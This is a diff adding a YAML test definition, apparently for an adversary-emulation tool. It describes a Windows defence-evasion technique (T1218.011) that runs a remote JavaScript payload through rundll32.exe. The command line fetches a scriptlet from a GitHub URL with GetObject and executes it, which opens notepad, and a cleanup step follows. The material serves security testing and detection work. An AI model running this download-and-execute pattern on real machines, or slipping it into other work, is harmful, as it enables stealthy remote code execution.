@@ -1,0 +1,19 @@
+---
+- id: d68bca253560877e22685a3dd3ff4dd4
+  name: Rundll32 execute JavaScript Remote Payload With GetObject
+  description: "Test execution of a remote script using rundll32.exe. Upon execution\
+    \ notepad.exe will be opened. \nThis has been used by Win32/Poweliks malware and\
+    \ works as described [here](https://www.stormshield.com/news/poweliks-command-line-confusion/)\n\
+    \nNote: The GetObject function is no longer supported in Internet Explorer v9\
+    \ (2011) and later so this technique would only work where very old versions of\
+    \ IE are installed. \n"
+  tactic: stealth
+  technique:
+    attack_id: T1218.011
+    name: 'Signed Binary Proxy Execution: Rundll32'
+  platforms:
+    windows:
+      cmd:
+        command: rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct").Exec();window.close();
+        payloads: []
+        cleanup: taskkill /IM notepad.exe /f
